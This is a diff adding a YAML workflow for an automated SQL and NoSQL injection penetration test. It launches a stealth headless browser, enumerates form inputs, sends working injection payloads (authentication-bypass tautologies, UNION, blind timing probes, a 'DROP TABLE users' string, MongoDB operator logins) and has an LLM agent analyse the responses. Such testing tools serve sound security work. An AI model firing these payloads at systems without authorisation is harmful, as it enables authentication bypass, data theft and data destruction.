@@ -1,0 +1,162 @@
+# Pentest: SQL & Database Injection
+# OWASP A03:2021 — Injection
+id: pentest_sql_injection
+name: SQL & Database Injection Test
+version: "1.0.0"
+description: SQL injection, NoSQL injection, XPath injection, LDAP injection
+
+steps:
+  - id: start
+    module: flow.start
+    label: Start
+    params: {}
+    orderIndex: 0
+
+  - id: launch
+    module: browser.launch
+    label: Launch Browser
+    params:
+      stealth: true
+      headless: true
+    orderIndex: 1
+
+  - id: discover_inputs
+    module: browser.evaluate
+    label: Discover Input Points
+    params:
+      script: |
+        (async function() {
+          const results = { forms: [], api_params: [], search_endpoints: [] };
+
+          // Collect all forms with inputs
+          document.querySelectorAll('form').forEach(f => {
+            const inputs = [...f.querySelectorAll('input, textarea, select')].map(i => ({
+              name: i.name || i.id, type: i.type, tag: i.tagName
+            }));
+            results.forms.push({
+              action: f.action, method: f.method, inputs: inputs
+            });
+          });
+
+          // Detect search/filter patterns in URL
+          const url = new URL(location.href);
+          url.searchParams.forEach((v, k) => {
+            results.api_params.push({ key: k, value: v });
+          });
+
+          return JSON.stringify(results, null, 2);
+        })()
+    orderIndex: 2
+
+  - id: sql_payloads
+    module: http.batch
+    label: SQL Injection Probes
+    params:
+      description: Test common SQL injection payloads
+      requests:
+        # Classic SQL injection
+        - method: GET
+          url: "{{target_url}}/api/search?q=' OR '1'='1"
+        - method: GET
+          url: "{{target_url}}/api/search?q=' UNION SELECT NULL--"
+        - method: GET
+          url: "{{target_url}}/api/search?q=1; DROP TABLE users--"
+        # Time-based blind
+        - method: GET
+          url: "{{target_url}}/api/search?q=' OR SLEEP(5)--"
+        - method: GET
+          url: "{{target_url}}/api/search?q=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+        # Boolean-based blind
+        - method: GET
+          url: "{{target_url}}/api/search?q=1' AND 1=1--"
+        - method: GET
+          url: "{{target_url}}/api/search?q=1' AND 1=2--"
+        # Error-based
+        - method: GET
+          url: "{{target_url}}/api/search?q=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
+      measure_time: true
+      detect_patterns:
+        - "sql syntax"
+        - "mysql_fetch"
+        - "pg_query"
+        - "ORA-"
+        - "sqlite3"
+        - "unclosed quotation"
+        - "SQLSTATE"
+    orderIndex: 3
+
+  - id: nosql_payloads
+    module: http.batch
+    label: NoSQL Injection Probes
+    params:
+      description: Test MongoDB/NoSQL injection
+      requests:
+        - method: POST
+          url: "{{target_url}}/api/login"
+          headers: { "Content-Type": "application/json" }
+          body: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+        - method: POST
+          url: "{{target_url}}/api/search"
+          headers: { "Content-Type": "application/json" }
+          body: '{"query": {"$where": "sleep(5000)"}}'
+        - method: GET
+          url: "{{target_url}}/api/users?id[$ne]=null"
+      measure_time: true
+    orderIndex: 4
+
+  - id: param_tampering
+    module: http.batch
+    label: Parameter Tampering
+    params:
+      description: Test type juggling and parameter pollution
+      requests:
+        - method: GET
+          url: "{{target_url}}/api/search?q[]=1&q[]=2"
+        - method: POST
+          url: "{{target_url}}/api/login"
+          headers: { "Content-Type": "application/json" }
+          body: '{"username": true, "password": true}'
+        - method: POST
+          url: "{{target_url}}/api/login"
+          headers: { "Content-Type": "application/json" }
+          body: '{"username": 0, "password": 0}'
+    orderIndex: 5
+
+  - id: analyze
+    module: llm.agent
+    label: Analyze Injection Results
+    params:
+      model: gpt-4o
+      prompt: |
+        Analyze SQL/NoSQL injection test results.
+
+        SQL payloads: ${sql_payloads.data}
+        NoSQL payloads: ${nosql_payloads.data}
+        Parameter tampering: ${param_tampering.data}
+
+        For each response, check:
+        1. Error messages revealing DB technology
+        2. Response time anomalies (time-based blind)
+        3. Response body differences (boolean-based blind)
+        4. Data returned that shouldn't be accessible
+        5. HTTP 200 on payloads that should fail
+
+        Output JSON: { "findings": [...], "db_technology": "...", "severity": "...", "summary": "..." }
+    orderIndex: 6
+
+  - id: report
+    module: output.display
+    label: Report
+    params:
+      format: json
+      data: "${analyze.data}"
+    orderIndex: 7
+
+edges:
+  - { source: start, target: launch }
+  - { source: launch, target: discover_inputs }
+  - { source: discover_inputs, target: sql_payloads }
+  - { source: sql_payloads, target: nosql_payloads }
+  - { source: nosql_payloads, target: param_tampering }
+  - { source: param_tampering, target: analyze }
+  - { source: analyze, target: report }
